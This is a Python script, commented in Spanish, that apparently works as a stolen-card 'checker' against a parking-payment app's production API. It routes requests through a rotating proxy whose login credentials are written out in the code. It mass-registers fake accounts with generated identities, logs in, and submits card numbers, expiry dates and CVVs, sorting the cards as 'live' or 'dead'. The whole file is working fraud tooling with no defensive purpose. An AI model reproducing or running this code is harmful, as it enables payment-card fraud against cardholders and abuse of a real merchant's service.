import json
import time
import requests
from faker import Faker

fake = Faker()

# ---------------------------
# PROXY CONFIG
# ---------------------------

PROXY_HOST = "p.webshare.io:80"
PROXY_USER = "izvhxurt-rotate"
PROXY_PASS = "acx0bzc9xbkg"

PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}"

# Crear sesión global con proxy
c = requests.Session()

proxies = {
    "http": PROXY_URL,
    "https": PROXY_URL,
}

proxies.update(proxies)
REGISTER_URL = "https://parkingpay-api-prod.azurewebsites.net/api/app/usuarios/registro"
LOGIN_URL = "https://parkingpay-api-prod.azurewebsites.net/api/auth"
CARD_URL = "https://parkingpay-api-prod.azurewebsites.net/api/app/conductor/tarjetas"

PASSWORD = "Tumama19012!"

# ---------------------------
# REGISTRO
# ---------------------------
def registro_usuario():
    email = fake.email()

    payload = {
        "correoElectronico": email,
        "nombre": fake.first_name(),
        "apellidos": fake.last_name(),
        "telefono": ''.join(str(fake.random_digit()) for _ in range(10)),
        "contrasena": PASSWORD
    }

    headers = {
        "User-Agent": "Dart/3.8 (dart:io)",
        "Content-Type": "application/json; charset=utf-8"
    }

    r = c.post(
        REGISTER_URL,
        data=json.dumps(payload),
        headers=headers,
        timeout=20
    )

    return r, email


def registrar_usuario_hasta_exito(max_intentos=10, delay=2):
    for _ in range(max_intentos):
        r, email = registro_usuario()
        if r and r.status_code in (200, 201):
            return email
        time.sleep(delay)
    return None


# ---------------------------
# LOGIN
# ---------------------------
def login_usuario(email):
    payload = {
        "correoElectronico": email,
        "contrasena": PASSWORD
    }

    headers = {
        "User-Agent": "Dart/3.8 (dart:io)",
        "Content-Type": "application/json; charset=utf-8"
    }

    r = c.post(
        LOGIN_URL,
        data=json.dumps(payload),
        headers=headers,
        timeout=20
    )

    if r.status_code in (200, 201):
        try:
            data = r.json()
            return (
                data.get("token")
                or data.get("accessToken")
                or (data.get("data") or {}).get("token")
            )
        except Exception:
            pass

    return None


# ---------------------------
# FUNCIÓN QUE LLAMA EL HANDLER
# ---------------------------
def procesar_tarjeta(card: str, route=None) -> dict:
    try:
        cc, mm, yy, cvv = card.split("|")
    except Exception:
        return {
            "status": "error",
            "message": "Formato inválido",
            "card": card
        }

    email = registrar_usuario_hasta_exito()
    if not email:
        return {
            "status": "error",
            "message": "Registro fallido",
            "cc": card
        }

    token = login_usuario(email)
    if not token:
        return {
            "status": "error",
            "message": "Login fallido",
            "cc": card
        }

    payload = {
        "numero": cc,
        "expiracionMes": mm,
        "expiracionYear": yy
    }

    headers = {
        "authorization": token,
        "user-agent": "Dart/2.18 (dart:io)",
        "content-type": "application/json; charset=utf-8"
    }

    try:
        r = requests.post(
            CARD_URL,
            data=json.dumps(payload),
            headers=headers,
            timeout=30
        )

        source = r.text.lower()

        # ---------------------------
        # RESPUESTAS (LÓGICA SIMPLE)
        # ---------------------------
        # ✅ LIVE
        if r.status_code == 200:
            return {
                "status": "live",
                "message": "Charged CCN $1.00 MX",
                "cc": card
            }

        # ❌ DEAD (Stripe / error servidor)
        if r.status_code == 500 or "stripe" in source:
            return {
                "status": "dead",
                "message": "Your card was declined",
                "cc": card
            }

        # ⚠️ ERROR
        return {
            "status": "error",
            "message": f"Gateway error {r.status_code}",
            "cc": card
        }

    except Exception as e:
        return {
            "status": "error",
            "message": str(e),
            "cc": card
        }
